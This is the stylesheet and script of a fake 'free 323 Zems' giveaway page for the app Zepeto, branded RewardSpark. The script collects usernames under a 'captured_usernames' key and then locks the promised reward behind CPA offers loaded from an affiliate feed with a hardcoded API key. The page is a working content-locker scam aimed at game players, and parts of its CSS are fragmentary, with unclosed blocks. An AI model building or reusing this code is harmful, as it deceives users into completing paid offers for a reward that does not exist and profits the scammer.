    position: relative;
    overflow-x: hidden;
    -webkit-font-smoothing: antialiased;
  }
  
  body::before {
    content: '';
    position: fixed;
    top: -50px;
    left: -50px;
    width: 200px;
    height: 200px;
    background: radial-gradient(circle, rgba(255, 100, 200, 0.35), transparent 70%);
    border-radius: 50%;
    z-index: -1;
    pointer-events: none;
  }
  
  body::after {
    content: '';
    position: fixed;
    bottom: -80px;
    right: -80px;
    width: 260px;
    height: 260px;
    background: radial-gradient(circle, rgba(100, 200, 255, 0.35), transparent 70%);
    border-radius: 50%;
    z-index: -1;
    pointer-events: none;
  }
  
  .wrapper {
    max-width: 720px;
    margin: 0 auto;
    position: relative;

  .logo {

    font-size: 24px;
    font-weight: 900;
    color: #2b1a4a;

  .logo .spark { color: #ff3ea5; }
  
  .free-badge {

    color: #fff;
    font-size: 13px;
    font-weight: 900;
    letter-spacing: 2px;
    padding: 8px 20px;
    border-radius: 30px;
    box-shadow: 0 6px 15px rgba(255, 62, 165, 0.4);

  }
  
  @keyframes pulse {
    0%, 100% { transform: scale(1); }
    50% { transform: scale(1.06); }

  h1 {
    text-align: center;
    font-size: 40px;
    font-weight: 900;
    color: #2b1a4a;
    line-height: 1.1;
    margin-bottom: 8px;
    letter-spacing: -1px;
  }
  
  h1 .highlight {
    background: linear-gradient(90deg, #ff3ea5, #a855f7);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
  }
  
  .subtitle {
    text-align: center;
    font-size: 15px;
    font-weight: 600;
    color: #6b4a9a;
    margin-bottom: 22px;
  }
  
  .zems-card-wrap {
    display: flex;
    justify-content: center;
    padding: 10px 0 20px;
  }
  
  .zems-card {
    width: 340px;
    height: 210px;
    background: linear-gradient(145deg, #a855f7 0%, #ff3ea5 100%);
    border-radius: 24px;
    padding: 24px 26px;
    position: relative;
    box-shadow: 0 15px 40px rgba(168, 85, 247, 0.45);
    display: flex;
    flex-direction: column;
    color: #fff;
    overflow: hidden;
    transform: rotate(-2deg);
    transition: transform 0.3s;
  }
  
  .zems-card:hover { transform: rotate(0deg) scale(1.03); }
  
  .zems-card::before {
    content: '';
    position: absolute;
    top: -40%;
    right: -30%;
    width: 220px;
    height: 220px;
    background: radial-gradient(circle, rgba(255,255,255,0.35) 0%, transparent 70%);
    border-radius: 50%;
  }
  
  .zems-card::after {
    content: '✨';
    position: absolute;
    top: 15px;
    right: 20px;
    font-size: 22px;
  }
  
  .card-top {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    margin-bottom: 12px;
    position: relative;
    z-index: 1;
  }
  
  .brand {
    font-size: 24px;
    font-weight: 900;
    letter-spacing: -0.5px;
    line-height: 1;
  }
  
  .amount {
    font-size: 42px;
    font-weight: 900;
    letter-spacing: -2px;
    line-height: 1;
    color: #fff5b8;
    text-shadow: 0 2px 8px rgba(0,0,0,0.2);
  }
  
  .card-label {
    font-size: 13px;
    font-weight: 800;
    letter-spacing: 3px;
    color: rgba(255,255,255,0.85);
    margin-top: auto;
    position: relative;
    z-index: 1;
  }
  
  .card-emoji {
    font-size: 40px;
    margin-top: 5px;
    position: relative;
    z-index: 1;
  }
  
  .form-box {
    background: #fff;
    border-radius: 24px;
    padding: 26px 24px;
    max-width: 560px;
    margin: 0 auto;
    box-shadow: 0 15px 45px rgba(120, 60, 200, 0.18);
    border: 3px solid #fff;
    position: relative;
  }
  
  .form-title {
    text-align: center;
    font-size: 20px;
    font-weight: 900;
    color: #2b1a4a;
    margin-bottom: 6px;
  }
  
  .form-subtitle {
    text-align: center;
    font-size: 13px;
    color: #8a7aa8;
    margin-bottom: 20px;
  }
  
  .field-label {
    display: block;
    font-size: 14px;
    font-weight: 800;
    color: #2b1a4a;
    margin-bottom: 8px;
  }
  
  .input-wrap {
    position: relative;
    margin-bottom: 18px;
  }
  
  .input-wrap input {
    width: 100%;
    padding: 16px 55px 16px 18px;
    border: 2px solid #e8d9ff;
    border-radius: 16px;
    font-size: 16px;
    background: #faf6ff;
    transition: all 0.2s;
    font-family: inherit;
    font-weight: 600;
    color: #2b1a4a;
  }
  
  .input-wrap input::placeholder {
    color: #b8a8d0;
    font-weight: 500;
  }
  
  .input-wrap input:focus {
    outline: none;
    border-color: #a855f7;
    box-shadow: 0 0 0 4px rgba(168, 85, 247, 0.15);
    background: #fff;
  }
  
  .input-wrap input.error {
    border-color: #ff3e6a;
    animation: shake 0.3s;
  }
  
  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-6px); }
    75% { transform: translateX(6px); }
  }
  
  .input-icon {
    position: absolute;
    right: 14px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 22px;
    pointer-events: none;
  }
  
  .legal-text {
    font-size: 10.5px;
    color: #8a7aa8;
    line-height: 1.55;
    margin-bottom: 18px;
    text-align: left;
  }
  
  .legal-text a {
    color: #a855f7;
    text-decoration: underline;
    font-weight: 600;
  }
  
  .continue-btn {
    display: block;
    width: 100%;
    padding: 18px;
    background: linear-gradient(90deg, #ff3ea5, #a855f7);
    color: #fff;
    font-size: 19px;
    font-weight: 900;
    letter-spacing: 1.5px;
    border: none;
    border-radius: 50px;
    cursor: pointer;
    transition: all 0.25s;
    box-shadow: 0 10px 25px rgba(255, 62, 165, 0.45);
    font-family: inherit;
    text-transform: uppercase;
  }
  
  .continue-btn:hover:not(:disabled) {
    transform: translateY(-3px);
    box-shadow: 0 15px 35px rgba(255, 62, 165, 0.6);
  }
  
  .continue-btn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
  }
  
  .trust-row {
    display: flex;
    justify-content: center;
    gap: 15px;
    margin-top: 18px;
    flex-wrap: wrap;
  }
  
  .trust-item {
    display: flex;
    align-items: center;
    gap: 5px;
    font-size: 11px;
    font-weight: 700;
    color: #6b4a9a;
    background: #f5edff;
    padding: 6px 12px;
    border-radius: 20px;
  }
  
  /* ===== Offer list ===== */
  .offer-step {
    display: none;
    animation: fadeIn 0.5s;
  }
  
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(15px); }
    to { opacity: 1; transform: translateY(0); }
  }
  
  .offer-step-header {
    text-align: center;
    margin-bottom: 20px;
  }
  
  .offer-step-header .step-icon {
    font-size: 60px;
    margin-bottom: 8px;
    display: block;
    animation: bounce 1.2s infinite;
  }
  
  @keyframes bounce {
    0%, 100% { transform: translateY(0) rotate(-5deg); }
    50% { transform: translateY(-10px) rotate(5deg); }
  }
  
  .offer-step-header h2 {
    font-size: 24px;
    font-weight: 900;
    color: #2b1a4a;
    margin-bottom: 6px;
  }
  
  .offer-step-header p {
    font-size: 14px;
    color: #6b4a9a;
    font-weight: 600;
  }
  
  .offer-progress {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 22px;
    padding: 0 40px;
  }
  
  .progress-dot {
    width: 34px;
    height: 34px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 15px;
    font-weight: bold;
    color: #fff;
    flex-shrink: 0;
    border: 3px solid #fff;
    box-shadow: 0 0 0 1px #ccc;
  }
  
  .progress-dot.done,
  .progress-dot.active {
    background: #a855f7;
    box-shadow: 0 0 0 1px #a855f7;
  }
  
  .progress-dot.empty {
    background: #fff;
    box-shadow: 0 0 0 1px #ccc;
  }
  
  .progress-line {
    flex: 1;
    height: 5px;
    background: #e0e0e0;
    border-radius: 3px;
    margin: 0 -2px;
    position: relative;
    z-index: 1;
  }
  
  .progress-line.filled { background: #a855f7; }
  
  #offerContainer {
    display: flex;
    flex-direction: column;
    gap: 12px;
  }
  
  #offerContainer > div {
    background: #faf6ff;
    border: 2px solid #e8d9ff;
    border-radius: 16px;
    padding: 4px;
    transition: all 0.25s;

  #offerContainer > div:hover {

    box-shadow: 0 8px 20px rgba(168, 85, 247, 0.2);

    font-weight: 800;
    font-size: 15px;
    border-radius: 12px;

    font-size: 20px;
    font-weight: 900;
    flex-shrink: 0;
  }

    color: #fff;

  #offerContainer a:hover::after {

    font-size: 14px;

      trust2: '⚡ Schnell',
      trust3: '🎮 Kein Passwort nötig',
      trustSecured: '✅ Verifiziert',
      trustInstant: '⚡ Sofort',
      offerTitle: 'Letzter Schritt!',
      offerSubtitle: 'Wähle unten ein Angebot, um deine <strong>323 Zems</strong> freizuschalten 💎',
      loadingOffers: 'Angebote werden geladen... ⏳',
      noOffers: '😢 Derzeit keine Angebote verfügbar.<br>Komm später wieder!',
      errorOffers: '⚠️ Fehler beim Laden der Angebote.<br>Überprüfe deine Verbindung und versuche es erneut.',
      footerTerms: 'Bedingungen',
      footerPrivacy: 'Datenschutz',
      footerContact: 'Kontakt',
      footerRights: '© 2025 RewardSpark. Alle Rechte vorbehalten.',
      footerDisclaimer: 'Nicht mit Zepeto oder Naver Corp. verbunden.'
    }
  };
  
  // ============================================================
  // 🌍 DÉTECTION DE LA LANGUE DU NAVIGATEUR
  // ============================================================
  function detectBrowserLang() {
    // Priorité 1 : URL ?lang=xx
    const urlParams = new URLSearchParams(window.location.search);
    const urlLang = (urlParams.get('lang') || '').toLowerCase().substring(0, 2);
    if (urlLang && TRANSLATIONS[urlLang]) return urlLang;
    
    // Priorité 2 : navigateur (navigator.languages puis navigator.language)
    const browserLangs = [];
    if (navigator.languages && navigator.languages.length) {
      browserLangs.push(...navigator.languages);
    }
    if (navigator.language) browserLangs.push(navigator.language);
    
    for (const bl of browserLangs) {
      const code = (bl || '').toLowerCase().split(/[-_]/)[0];
      if (TRANSLATIONS[code]) return code;
    }
    
    // Fallback
    return 'en';
  }
  
  // ============================================================
  // 🌍 APPLIQUER LA LANGUE
  // ============================================================
  let currentLang = 'en';
  
  function applyLanguage(langCode) {
    if (!TRANSLATIONS[langCode]) langCode = 'en';
    currentLang = langCode;
    const t = TRANSLATIONS[langCode];
    
    document.documentElement.lang = t.lang;
    document.documentElement.dir = t.dir;
    
    document.querySelectorAll('[data-i18n]').forEach(el => {
      const key = el.getAttribute('data-i18n');
      if (t[key] !== undefined) el.innerHTML = t[key];
    });
    
    document.querySelectorAll('[data-i18n-html]').forEach(el => {
      const key = el.getAttribute('data-i18n-html');
      if (t[key] !== undefined) el.innerHTML = t[key];
    });
    
    const input = document.getElementById('username');
    if (input && t.placeholder) input.placeholder = t.placeholder;
    
    const titles = {
      fr: 'Zepeto - 323 Zems Gratuits 🎁',
      en: 'Zepeto - 323 Free Zems 🎁',
      es: 'Zepeto - 323 Zems Gratis 🎁',
      de: 'Zepeto - 323 Gratis Zems 🎁'
    };
    document.title = titles[langCode] || titles.en;
  }
  
  // ============================================================
  // ⚙️ CONFIGURATION CPA
  // ============================================================
  const API_BASE = "https://dtvpp42hfuyb2.cloudfront.net/public/offers/feed.php";
  const API_USER_ID = "141902";
  const API_KEY = "514112dda72e533b2db39a8e615341e9";
  const NUM_OFFERS = 5;
  
  function buildOfferUrl(username) {
    const s1 = encodeURIComponent(username);
    return API_BASE 
      + "?user_id=" + API_USER_ID 
      + "&api_key=" + API_KEY 
      + "&s1=" + s1 
      + "&s2=&callback=?";
  }
  
  // ============================================================
  // Validation
  // ============================================================
  function isValidUsername(username) {
    return /^[a-zA-Z0-9_.]{3,20}$/.test(username);
  }
  
  // ============================================================
  // Étape 1 : Soumission
  // ============================================================
  function handleSubmit() {
    const input = document.getElementById('username');
    const submitBtn = document.getElementById('submitBtn');
    let username = input.value.trim();
    
    if (username.startsWith('@')) username = username.substring(1);
    
    if (!isValidUsername(username)) {
      input.classList.add('error');
      input.focus();
      setTimeout(() => input.classList.remove('error'), 600);
      return;
    }
    
    submitBtn.disabled = true;
    submitBtn.textContent = '...';
    
    try {
      const users = JSON.parse(localStorage.getItem('captured_usernames') || '[]');
      users.push({ 
        username, 
        offer: 'zepeto_323_zems', 
        lang: currentLang,
        date: new Date().toISOString() 
      });
      localStorage.setItem('captured_usernames', JSON.stringify(users));
    } catch(e) {}
    
    document.getElementById('mainScreen').style.display = 'none';
    document.getElementById('offerScreen').style.display = 'block';
    window.scrollTo({ top: 0, behavior: 'smooth' });
    
    loadOffers(username);
  }
  
  // ============================================================
  // Étape 2 : Offres CPA
  // ============================================================
  function loadOffers(username) {
    const $container = $("#offerContainer");
    const t = TRANSLATIONS[currentLang];
    const offerUrl = buildOfferUrl(username);
    
    $container.html(
      '<div class="loader-offers">' +
      '<div class="loader-spinner"></div>' +
      '<span>' + t.loadingOffers + '</span>' +
      '</div>'
    );
    
    $.getJSON(offerUrl, function(offers) {
      $container.empty();
      
      if (!offers || offers.length === 0) {
        $container.html('<div class="no-offers">' + t.noOffers + '</div>');
        return;
      }
      
      offers = offers.splice(0, NUM_OFFERS);
      
      var html = '';
      $.each(offers, function(key, offer) {
        html += '<div><a href="' + offer.url + '" target="_blank" rel="noopener" title="' 
              + (offer.conversion || '') + '">' 
              + (offer.anchor || 'Offre') 
              + '</a></div>';
      });
      
      $container.append(html);
    }).fail(function() {
      $container.html('<div class="no-offers">' + t.errorOffers + '</div>');
    });
  }
  
  // ============================================================
  // 🚀 INITIALISATION
  // ============================================================
  $(function() {
    // Détection automatique de la langue du navigateur
    const lang = detectBrowserLang();
    console.log('🌍 Langue détectée:', lang);
    
    // Applique la langue
    applyLanguage(lang);
    
    // Events
    document.getElementById('username').addEventListener('keypress', (e) => {
      if (e.key === 'Enter') handleSubmit();
    });
    
    document.getElementById('username').addEventListener('input', (e) => {
      e.target.classList.remove('error');
    });
  });
  
</script>
